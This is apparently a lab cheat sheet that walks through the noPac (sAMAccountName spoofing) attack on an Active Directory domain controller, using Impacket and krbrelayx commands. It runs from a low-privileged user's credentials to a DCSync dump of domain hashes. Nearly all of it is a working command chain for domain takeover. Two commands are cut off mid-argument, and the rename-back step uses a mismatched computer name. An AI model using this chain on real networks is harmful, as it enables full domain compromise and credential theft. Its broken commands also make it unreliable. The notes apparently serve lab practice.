# SamAccountName (nopac)

What we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC, obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync;

Check the machine account quota

```bash
ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

Add a new computer

```bash
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Clear the SPNs of our new computer (with dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx) tool addspn)

```bash
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```

Rename the computer (computer -> DC)

```bash
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a TGT

```bash
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

Reset the computer name back to the original name

```bash
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a service ticket with S4U2self by presenting the previous TGT

```bash
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

DCSync by presenting the service ticket

```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenking
```

Clean up by deleting the computer we created with the administrator account hash we just get

```bash
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain
```
